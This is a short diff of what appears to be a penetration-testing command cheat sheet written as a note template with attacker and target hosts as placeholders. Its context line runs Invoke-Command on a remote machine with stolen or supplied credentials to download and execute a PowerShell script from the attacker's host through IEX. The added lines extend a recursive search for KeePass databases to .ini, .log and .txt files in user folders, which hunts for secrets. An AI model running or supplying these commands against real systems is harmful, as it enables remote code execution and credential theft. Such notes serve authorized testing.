@@ -134,9 +134,10 @@ $cred = New-Object System.Management.Automation.PSCredential("<% tp.frontmatter[
 Invoke-Command -Computer <% tp.frontmatter["RHOST"] %> -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://<% tp.frontmatter["LHOST"] %>/<FILE>.ps1') } -Credential $cred
 
 
-# Search For File
+# Search For Important Files
 Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
-
+Get-ChildItem -Path C:\Users\ -Include *.ini,*.log -File -Recurse
+Get-ChildItem -Path C:\Users\ -Include *.txt -File -Recurse
 ```
 
 
